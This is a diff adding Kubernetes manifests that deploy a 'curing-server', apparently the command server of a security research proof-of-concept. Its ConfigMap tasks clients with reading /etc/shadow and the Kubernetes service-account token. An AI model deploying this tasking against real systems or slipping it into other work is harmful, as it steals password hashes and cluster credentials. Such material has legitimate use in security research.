@@ -1,0 +1,89 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: curing-server
+  labels:
+    app: curing-server
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: curing-server
+  template:
+    metadata:
+      labels:
+        app: curing-server
+    spec:
+      containers:
+      - name: server
+        image: quay.io/benarmosec/curing:1.1-server
+        ports:
+        - containerPort: 8888
+          name: tcp
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "50m"
+          limits:
+            memory: "128Mi"
+            cpu: "100m"
+        volumeMounts:
+        - name: commands-config
+          mountPath: /app/commands.json
+          subPath: commands.json
+      volumes:
+      - name: commands-config
+        configMap:
+          name: curing-server-commands
+        
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: curing-server-service
+  labels:
+    app: curing-server
+spec:
+  type: ClusterIP
+  ports:
+  - port: 8888
+    targetPort: 8888
+    protocol: TCP
+    name: tcp
+  selector:
+    app: curing-server
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: curing-server-commands
+  labels:
+    app: curing-server
+data:
+  commands.json: |
+    {
+      "default_commands": [
+        {
+          "type": "readfile",
+          "id": "read_shadow",
+          "path": "/etc/shadow"
+        }
+      ],
+      "group_commands": {
+        "kubernetes": [
+          {
+            "type": "readfile",
+            "id": "read_sa_token",
+            "path": "/var/run/secrets/kubernetes.io/serviceaccount/token"
+          },
+          {
+            "type": "readfile",
+            "id": "read_shadow",
+            "path": "/etc/shadow"
+          }
+        ]
+      },
+      "client_specific": {}
+    }
+
+      
